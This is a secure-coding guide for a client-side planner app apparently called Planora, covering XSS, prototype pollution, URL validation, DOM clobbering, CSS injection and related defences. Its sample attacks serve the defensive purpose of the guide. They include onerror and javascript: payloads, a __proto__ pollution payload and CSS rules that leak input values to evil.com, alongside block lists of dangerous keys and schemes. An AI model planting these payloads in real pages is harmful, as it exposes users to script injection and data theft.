# Secure Coding Practices

Detailed guidance for writing safe rendering and DOM manipulation code in Planora.

## Table of Contents

1. [XSS Prevention Patterns](#xss-prevention-patterns)
2. [Safe DOM Manipulation](#safe-dom-manipulation)
3. [innerHTML Audit Guide](#innerhtml-audit-guide)
4. [Converting innerHTML to Safe Alternatives](#converting-innerhtml-to-safe-alternatives)
5. [Template Rendering Patterns](#template-rendering-patterns)
6. [Event Handler Security](#event-handler-security)
7. [Prototype Pollution Prevention](#prototype-pollution-prevention)
8. [URL Validation Patterns](#url-validation-patterns)
9. [Blob URL Lifecycle Management](#blob-url-lifecycle-management)

---

## XSS Prevention Patterns

### The Threat Model

Planora's XSS surface comes from two directions:

1. **Storage-based XSS** — Malicious content in localStorage (from a compromised browser extension, shared device, or malicious QR import) that gets rendered via innerHTML without sanitization.
2. **Import-based XSS** — Malicious data in a QR code or imported JSON backup file that contains script payloads in string fields (e.g., an event title like `<img src=x onerror=alert(1)>`).

There's no reflected or server-side XSS because there's no server. But storage-based XSS is persistent and fires every time the app loads — making it arguably more dangerous.

### The Golden Rules

1. **Escape at the point of rendering, not at the point of storage.** Store data as-is (preserving fidelity), but always escape when inserting into the DOM. This way the escaping matches the output context.

2. **Use the right escaping for the context:**
   - HTML text content → `escapeHtml()` or `textContent`
   - HTML attribute values → `escapeHtml()` inside quoted attributes
   - CSS values → `CSS.escape()` or the existing `cssEscape()` helper
   - URL parameters → `encodeURIComponent()`
   - Never interpolate user data into `<script>` blocks, `javascript:` URLs, or unquoted attributes

3. **Audit every innerHTML assignment.** Every `.innerHTML = ` in the codebase should have a comment or clear evidence that all dynamic values are escaped. Treat unmarked innerHTML as a bug.

### Contexts Where `escapeHtml()` Is NOT Sufficient

| Context | Risk | Safe Approach |
|---------|------|---------------|
| `href` or `src` attributes | `javascript:` protocol injection | Validate URL scheme is `http:`, `https:`, or known-safe |
| `style` attributes | CSS injection, data exfiltration | Use `cssEscape()` or set via `element.style.property` |
| Unquoted attributes | Attribute breakout | Always quote attribute values |
| `<script>` blocks | Direct code execution | Never interpolate user data into scripts |
| Event handler attributes (`onclick`, etc.) | Code execution | Use `addEventListener()` instead |

---

## Safe DOM Manipulation

### Preferred: createElement + textContent

```js
// ✅ SAFE — textContent escapes automatically
function renderCompanyLabel(name) {
  var span = document.createElement('span');
  span.className = 'company-label';
  span.textContent = name;
  return span;
}
```

### Preferred: Template with escapeHtml()

When the markup structure is complex enough that createElement becomes unwieldy:

```js
// ✅ SAFE — all dynamic values escaped
function renderEventCard(event) {
  return `
    <div class="event-card" data-id="${escapeHtml(event.id)}">
      <h3 class="event-title">${escapeHtml(event.title)}</h3>
      <span class="event-time">${escapeHtml(event.timeLabel)}</span>
    </div>
  `;
}
```

### Dangerous: Unescaped innerHTML

```js
// ❌ DANGEROUS — title could contain <script> or <img onerror>
dom.card.innerHTML = '<h3>' + event.title + '</h3>';

// ❌ DANGEROUS — even template literals don't auto-escape
dom.card.innerHTML = `<h3>${event.title}</h3>`;

// ✅ FIXED
dom.card.innerHTML = `<h3>${escapeHtml(event.title)}</h3>`;
```

### Safe CSS Value Injection

```js
// ✅ SAFE — uses cssEscape or element.style
element.style.setProperty('--marker-color', safeColor);

// ⚠️ CAREFUL — only if value is validated
style="--company-color:${escapeHtml(safeColor)};"
// Better: validate safeColor matches /^#[0-9a-fA-F]{3,8}$/
```

---

## innerHTML Audit Guide

Planora currently has ~73 innerHTML assignments. When auditing:

### Step 1: Classify Each Usage

| Category | Action |
|----------|--------|
| **Static content** (empty strings, hardcoded HTML) | Low risk — document and move on |
| **Dynamic with escapeHtml()** on all variables | Acceptable — verify escapeHtml covers the context |
| **Dynamic without escapeHtml()** | **Fix required** — add escapeHtml() or convert to safe DOM API |
| **Dynamic in dangerous context** (href, style, event handler) | **Fix required** — escapeHtml is not enough, use context-specific approach |

### Step 2: Check the Data Source

- Data from hardcoded constants → low risk
- Data from `state.*` / localStorage → medium risk (could be tampered)
- Data from external input (QR scan, file import, API response) → high risk

### Step 3: Prioritize Fixes

1. High-risk sources rendered without escaping → fix immediately
2. Medium-risk sources without escaping → fix in next iteration
3. Low-risk sources → document why they're safe, add escaping defensively

---

## Converting innerHTML to Safe Alternatives

### Pattern: Simple Text Content

```js
// Before (unnecessary innerHTML for plain text)
el.innerHTML = event.title;

// After
el.textContent = event.title;
```

### Pattern: Element with Class and Text

```js
// Before
container.innerHTML = '<div class="empty-msg">No entries yet</div>';

// After (if truly static — innerHTML is fine here, but for consistency:)
var msg = document.createElement('div');
msg.className = 'empty-msg';
msg.textContent = 'No entries yet';
container.replaceChildren(msg);
```

### Pattern: List Rendering

```js
// Before
container.innerHTML = items.map(item =>
  `<div class="item">${item.name}</div>`
).join('');

// After — Option A: escapeHtml (simpler for large templates)
container.innerHTML = items.map(item =>
  `<div class="item">${escapeHtml(item.name)}</div>`
).join('');

// After — Option B: DOM API (safest)
container.replaceChildren();
items.forEach(item => {
  var div = document.createElement('div');
  div.className = 'item';
  div.textContent = item.name;
  container.appendChild(div);
});
```

### Pattern: Complex Card with Mixed Content

For large templates with many dynamic values, innerHTML + escapeHtml is pragmatic. The key is making sure nothing slips through:

```js
function renderCard(card) {
  // Every ${} below MUST use escapeHtml()
  return `
    <div class="card" data-id="${escapeHtml(card.id)}">
      <div class="card-title">${escapeHtml(card.name)}</div>
      <div class="card-meta">${escapeHtml(card.timezone)}</div>
      <div class="card-color" style="--c:${validateColor(card.color)}"></div>
    </div>
  `;
}

function validateColor(color) {
  // Only allow valid hex colors
  return /^#[0-9a-fA-F]{3,8}$/.test(color) ? color : '#888888';
}
```

---

## Template Rendering Patterns

### Builder Pattern for Reusable Templates

When a template is used across multiple functions, create a builder that enforces escaping:

```js
function html(strings, ...values) {
  return strings.reduce((result, str, i) =>
    result + str + (i < values.length ? escapeHtml(values[i]) : ''), ''
  );
}

// Usage — escapeHtml is applied automatically to all interpolated values
container.innerHTML = html`
  <div class="event-card">
    <h3>${event.title}</h3>
    <span>${event.time}</span>
  </div>
`;
```

This tagged template pattern eliminates the risk of forgetting escapeHtml on individual values. Consider adopting this for new rendering code.

---

## Event Handler Security

### Avoid Inline Event Handlers

```html
<!-- ❌ AVOID — inline handlers can't be protected by CSP -->
<button onclick="deleteItem('${id}')">Delete</button>

<!-- ✅ BETTER — use data attributes + delegated listener -->
<button data-action="delete" data-id="${escapeHtml(id)}">Delete</button>
```

```js
// Delegated handler
document.addEventListener('click', function(e) {
  var btn = e.target.closest('[data-action="delete"]');
  if (btn) deleteItem(btn.dataset.id);
});
```

Planora already uses event delegation in many places. Extend this pattern to new features rather than adding inline `onclick` attributes. This also enables stricter CSP without `unsafe-inline`.

### The Existing Inline Handlers

Lines ~9457 and ~11900 contain inline `onclick` attributes injected via innerHTML. These should be migrated to delegated event listeners when those sections are next modified. They currently prevent the use of `script-src` CSP without `unsafe-inline` or `unsafe-hashes`.

---

## Prototype Pollution Prevention

### The Threat

Prototype pollution occurs when an attacker injects properties into JavaScript's `Object.prototype` through unsafe object merging, JSON parsing, or deep-copy operations. Once `Object.prototype` is polluted, **every object in the application** inherits the malicious properties — potentially enabling privilege escalation, logic bypasses, or XSS.

This is particularly relevant to Planora because:
- The QR import and JSON file import paths parse external JSON and merge it into app state
- A crafted payload containing `__proto__`, `constructor`, or `prototype` keys could pollute the global Object prototype
- The app uses plain object literals (`{}`) throughout, all of which inherit from `Object.prototype`

### Attack Example

```js
// Malicious QR/import payload
{
  "events": [],
  "__proto__": {
    "isAdmin": true,
    "innerHTML": "<img src=x onerror=alert(1)>"
  }
}

// If this is naively merged:
Object.assign(state, importedData);
// Now every object in the app has .isAdmin === true
// ({}).isAdmin → true
```

### Defense Patterns

#### 1. Reject Dangerous Keys in Imported Data

```js
var DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function hasDangerousKeys(obj) {
  if (typeof obj !== 'object' || obj === null) return false;
  for (var key in obj) {
    if (DANGEROUS_KEYS.has(key)) return true;
    if (typeof obj[key] === 'object' && hasDangerousKeys(obj[key])) return true;
  }
  return false;
}

// Use before merging any external data
function safeImport(data) {
  if (hasDangerousKeys(data)) {
    throw new Error('Import rejected: contains unsafe properties');
  }
  return data;
}
```

#### 2. Allowlist Fields Instead of Blocklisting

The strongest defense is to **never merge unknown properties**. Copy only the fields you expect:

```js
// ✅ SAFE — only known fields are copied
function sanitizeEvent(raw) {
  return {
    id: String(raw.id || ''),
    title: String(raw.title || ''),
    startDate: String(raw.startDate || ''),
    type: VALID_TYPES.includes(raw.type) ? raw.type : 'default'
  };
}

// ❌ DANGEROUS — copies everything, including __proto__
function unsafeCopy(raw) {
  return Object.assign({}, raw);
}
```

#### 3. Use `Object.create(null)` for Lookup Maps

When creating objects used as dictionaries/maps, use `Object.create(null)` so they don't inherit from `Object.prototype`:

```js
// ✅ SAFE — no prototype chain
var lookup = Object.create(null);
lookup['someKey'] = true;
// lookup.__proto__ → undefined (not pollutable)

// ✅ BETTER — use Map for key-value lookups
var lookup = new Map();
lookup.set('someKey', true);
```

#### 4. Freeze the Prototype (Defense-in-Depth)

As an additional layer, freeze `Object.prototype` early in the application lifecycle to prevent any pollution:

```js
// Add near the top of the app's script block
Object.freeze(Object.prototype);
```

**⚠️ Caution:** This may break third-party libraries that modify prototypes (unlikely for Planora's current deps, but test thoroughly). Test with qrcode, lz-string, and html5-qrcode before deploying.

#### 5. Safe JSON.parse Reviver

Use a `JSON.parse` reviver function to strip dangerous keys during parsing:

```js
function safeJSONParse(jsonString) {
  return JSON.parse(jsonString, function(key, value) {
    if (DANGEROUS_KEYS.has(key)) return undefined; // strip the key
    return value;
  });
}

// Use for all external JSON:
var imported = safeJSONParse(qrPayload);
```

### When to Apply

| Scenario | Required Defense |
|----------|-----------------|
| Parsing JSON from QR scan | `safeJSONParse` + field allowlisting |
| Parsing JSON from file import | `safeJSONParse` + field allowlisting |
| Merging config or settings objects | Field allowlisting, never `Object.assign` from untrusted |
| Creating lookup tables | `Object.create(null)` or `Map` |
| Library initialization | Test with `Object.freeze(Object.prototype)` |

---

## URL Validation Patterns

### The Threat

When user-provided strings are used as `href`, `src`, or similar URL attributes, an attacker can inject `javascript:`, `data:`, or `vbscript:` scheme URLs that execute code when clicked or loaded.

Planora's `escapeHtml()` does **not** protect against this — a perfectly HTML-safe string like `javascript:alert(1)` passes through escaping unchanged and still executes when used as a link target.

### URL Validation Utility

```js
/**
 * Validates that a URL uses a safe scheme.
 * Returns the URL if safe, or a fallback if not.
 */
function sanitizeURL(url, fallback) {
  fallback = fallback || '#';
  if (typeof url !== 'string') return fallback;
  
  // Trim and normalize
  var trimmed = url.trim();
  
  // Block empty strings
  if (!trimmed) return fallback;
  
  // Allow only safe schemes (case-insensitive)
  var SAFE_SCHEMES = /^(https?:\/\/|mailto:|tel:|#|\/)/i;
  if (!SAFE_SCHEMES.test(trimmed)) return fallback;
  
  // Extra guard: block any variation of javascript/vbscript/data
  // (handles \t, \n, encoded chars that browsers may interpret)
  var DANGEROUS_SCHEME = /^\s*(javascript|vbscript|data)\s*:/i;
  if (DANGEROUS_SCHEME.test(trimmed)) return fallback;
  
  return trimmed;
}
```

### Usage

```js
// ✅ SAFE — URL is validated before use in href
var link = `<a href="${escapeHtml(sanitizeURL(event.url))}">
  ${escapeHtml(event.title)}
</a>`;

// ❌ DANGEROUS — escapeHtml alone doesn't block javascript: URLs
var link = `<a href="${escapeHtml(event.url)}">${escapeHtml(event.title)}</a>`;

// ✅ SAFE — for programmatic navigation
function safeNavigate(url) {
  var safe = sanitizeURL(url);
  if (safe !== '#') window.location.href = safe;
}
```

### Contexts Requiring URL Validation

| Context | Example | Validate? |
|---------|---------|-----------|
| `<a href="...">` | Link to external site | Yes — always |
| `<img src="...">` | Dynamic image source | Yes — allow https: and data:image/ only |
| `<iframe src="...">` | Embedded content | Yes — and reconsider if you need iframes at all |
| `window.open(url)` | Programmatic navigation | Yes |
| `window.location = url` | Redirects | Yes — this is an open redirect if unvalidated |
| `fetch(url)` | API calls | Validate against an allowlist of known API domains |

---

## Blob URL Lifecycle Management

### The Problem

When Planora creates exports (JSON backup, QR images), it uses `URL.createObjectURL(blob)` to generate temporary `blob:` URLs. These URLs remain valid and accessible for the entire page lifetime unless explicitly revoked.

```js
// Current pattern (line ~10112)
var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
var url = URL.createObjectURL(blob);  // blob: URL created
// ... user downloads the file ...
// URL is never revoked — the blob stays in memory
```

### Risks

1. **Memory leaks** — Each unreleased blob URL holds its data in memory. Repeated exports without cleanup slowly consume browser memory.
2. **Data exposure window** — The blob URL is accessible from any script on the page for the entire session. A malicious extension could enumerate and read blob URLs.

### Safe Blob URL Pattern

```js
function triggerDownload(data, filename) {
  var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  var url = URL.createObjectURL(blob);
  
  var a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  
  // Clean up immediately after download triggers
  setTimeout(function() {
    URL.revokeObjectURL(url);
    document.body.removeChild(a);
  }, 100);
}

// For image preview URLs (QR code display, etc.)
function showTemporaryImage(blob, container, displayDurationMs) {
  var url = URL.createObjectURL(blob);
  container.src = url;
  
  // Revoke after the image is no longer needed
  container.addEventListener('load', function() {
    // For previews: revoke after a timeout or when the modal closes
    setTimeout(function() { URL.revokeObjectURL(url); }, displayDurationMs || 60000);
  }, { once: true });
}
```

### Best Practices

- **Always call `URL.revokeObjectURL()`** after the blob URL is no longer needed
- **Set a maximum lifetime** — even if cleanup logic fails, revoke on a timer as a safety net
- **Revoke when modals/dialogs close** — if a blob URL is displayed in a UI overlay, revoke when the overlay is dismissed
- **Avoid storing blob URLs in state** — they are transient by nature; regenerate if needed again

---

## 7. DOM Clobbering Prevention

### Threat Model

When an HTML element has an `id` attribute, the browser automatically creates a `window.{id}` property pointing to that element. If JavaScript code uses a bare global reference that matches an element ID, the DOM element **replaces** the expected value — potentially bypassing security checks, breaking logic, or enabling XSS.

```html
<!-- A page with this element... -->
<div id="config"></div>

<script>
// ...causes this to return the <div> instead of undefined
typeof config; // "object" (the HTMLDivElement)
config.toString(); // "[object HTMLDivElement]"
</script>
```

Named forms, embeds, and `name` attributes can also clobber globals.

### Planora's Risk Profile

The codebase has **420+ `id=` attributes**, many with names that overlap common variable patterns:

| Risky IDs | Concern |
|-----------|---------|
| `debugPanel`, `debugFab`, `debugBody` | Could shadow debug-related variables |
| `eventsList`, `eventTitleInput` | Overlap with `event*` patterns |
| `actionSheet`, `headerClock` | Common variable naming patterns |
| `importFileInput`, `exportBtn` | Security-relevant functionality |
| `data`, `status`, `form*`, `input*` | Generic names easily confused with JS vars |

### Prevention Patterns

**Rule 1: Never rely on bare global variable lookups for important values.**

```js
// ❌ VULNERABLE — can be clobbered if an element has id="config"
if (config && config.apiKey) {
  fetch(config.apiKey);
}

// ✅ SAFE — explicit scope reference
var appConfig = { apiKey: '...' };
if (appConfig && appConfig.apiKey) {
  fetch(appConfig.apiKey);
}
```

**Rule 2: Always use `document.getElementById()` to access DOM elements.**

```js
// ❌ RISKY — bare global lookup
debugPanel.style.display = 'block';

// ✅ SAFE — explicit DOM query
var debugPanel = document.getElementById('debugPanel');
if (debugPanel) debugPanel.style.display = 'block';
```

**Rule 3: Namespace ID prefixes to avoid collisions.**

```html
<!-- ❌ Generic ID — easy to collide with variables -->
<div id="status"></div>

<!-- ✅ Namespaced ID — unlikely to match a variable -->
<div id="pl-status-bar"></div>
```

**Rule 4: Guard against clobbered values in security-sensitive code.**

```js
// If you MUST check a global, verify it's the expected type
if (typeof myVar === 'string') {
  // Safe — DOM elements are never strings
}

// Or use Object.prototype.toString for robust type checking
if (Object.prototype.toString.call(myVar) === '[object Object]') {
  // Safe — filters out HTMLElements
}
```

### When Modifying Planora Code

- **Adding new elements:** Choose IDs that won't collide with any variable name. Use a prefix like `pl-` (e.g., `pl-event-list`, `pl-debug-panel`).
- **Adding new variables:** Ensure no existing element shares the name. Search `id="variableName"` before using a bare global.
- **Security-critical lookups:** Always use explicit `document.getElementById()` or scoped variables — never rely on automatic global ID bindings.

---

## 8. Secure Randomness

### The Problem

Planora has three different ID generation patterns:

| Location | Pattern | Secure? |
|----------|---------|---------|
| ~Line 8829 | `Math.random().toString(36).substr(2, 9)` | ❌ Predictable |
| ~Line 10450 | `crypto.randomUUID()` with `Math.random()` fallback | ✅ Good |
| ~Line 10600 | `Math.random().toString(36).substr(2, 9)` | ❌ Predictable |

`Math.random()` uses a PRNG seeded by the browser — its output can be predicted if an attacker observes enough values. `crypto.randomUUID()` and `crypto.getRandomValues()` use a CSPRNG and are safe.

### The Rule

**Always use the existing `cryptoRandomId()` function** (defined ~line 10450) for all ID generation. Never introduce new `Math.random()` calls for IDs.

```js
// ❌ Don't do this — even for "non-security" IDs
var id = Math.random().toString(36).substr(2, 9);

// ✅ Use the centralized function
var id = cryptoRandomId();
```

### When Is Math.random() Acceptable?

Only for non-identity purposes where predictability doesn't matter:
- Randomizing animation delays
- Shuffling display order for aesthetic purposes
- Test data generation during development

**Never** for: IDs, tokens, nonces, keys, import deduplication, or any value that could be referenced or compared.

### Remediation Priority

Update the two `Math.random()` ID generation sites (~lines 8829 and 10600) to use `cryptoRandomId()`. This is a low-effort, high-value fix.

---

## 9. Timing-Safe Comparison

### When to Use

Whenever comparing secrets or tokens — even in client-side code where the source is theoretically visible. The discipline prevents leaking information through response-time differences and establishes a pattern for future server-side code.

**Planora example:** The `__debugSecret` check (~line 4966) uses direct string comparison (`===`), which short-circuits on the first mismatched character.

### Pattern

```js
/**
 * Compare two strings in constant time.
 * Returns true if both strings are identical.
 */
function timingSafeCompare(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  if (a.length !== b.length) return false;

  var result = 0;
  for (var i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
}

// Usage:
if (timingSafeCompare(userInput, storedSecret)) {
  enableDebugMode();
}
```

**Note:** The early `length` check does leak whether the lengths match, but this is acceptable — the alternative (padding to equal length) adds complexity with minimal benefit for a client-side app.

---

## 10. CSS Injection & Exfiltration

### Beyond CSS.escape()

The main skill covers using `CSS.escape()` for dynamic values in selectors. But CSS injection can also be used for **data exfiltration** when user-controlled data is interpolated into style attributes or `<style>` blocks.

### The Attack

An attacker-controlled value injected into CSS can use `background-image: url(...)` to exfiltrate data:

```css
/* If user data is interpolated unsafely: */
.user-theme { color: USER_INPUT; }

/* Attacker input: red; } .secret[value^="a"] { background: url(https://evil.com/?char=a) */
```

Or using attribute selectors to brute-force hidden values character by character:

```css
input[value^="s"] { background: url(https://evil.com/?c=s); }
input[value^="se"] { background: url(https://evil.com/?c=se); }
/* ...enumerate until the full value is leaked */
```

### Planora-Specific Rules

1. **Never interpolate user data into `<style>` blocks or CSS custom properties without validation.**

```js
// ❌ Dangerous — user-controlled color could contain CSS injection
element.style.cssText = 'color: ' + userColor;

// ✅ Safe — validate the format strictly
if (/^#[0-9a-fA-F]{6}$/.test(userColor)) {
  element.style.color = userColor;
}
```

2. **Planora's theme system** uses hex color values. Always validate with the strict hex pattern before applying.

3. **Use `element.style.setProperty()`** instead of `cssText` concatenation when setting individual properties — it doesn't allow injection of additional declarations.

```js
// ✅ Safe — only sets the one property
element.style.setProperty('--user-accent', validatedHexColor);
```

---

## 11. postMessage Security (Future-Proofing)

### When This Applies

If Planora ever adds:
- OAuth popup flows
- Embedded iframes (third-party widgets, payment forms)
- Cross-tab communication
- Web Worker message passing

### Critical Pattern: Always Validate Origin

```js
// ❌ DANGEROUS — accepts messages from any origin
window.addEventListener('message', function(event) {
  processData(event.data);
});

// ✅ SAFE — verify the sender's origin
window.addEventListener('message', function(event) {
  if (event.origin !== 'https://trusted.planora.app') return;

  // Also validate the data structure
  if (!event.data || typeof event.data.type !== 'string') return;

  processData(event.data);
});
```

### Rules

1. **Always check `event.origin`** against an explicit allowlist
2. **Validate `event.data` structure** — never trust the shape of incoming messages
3. **Use `targetOrigin` when sending** — never use `'*'`
   ```js
   // ❌ Broadcasts to any origin
   popup.postMessage(data, '*');

   // ✅ Only the intended recipient gets it
   popup.postMessage(data, 'https://trusted.planora.app');
   ```
4. **Don't pass functions or DOM references** through postMessage — they can't be cloned and will throw
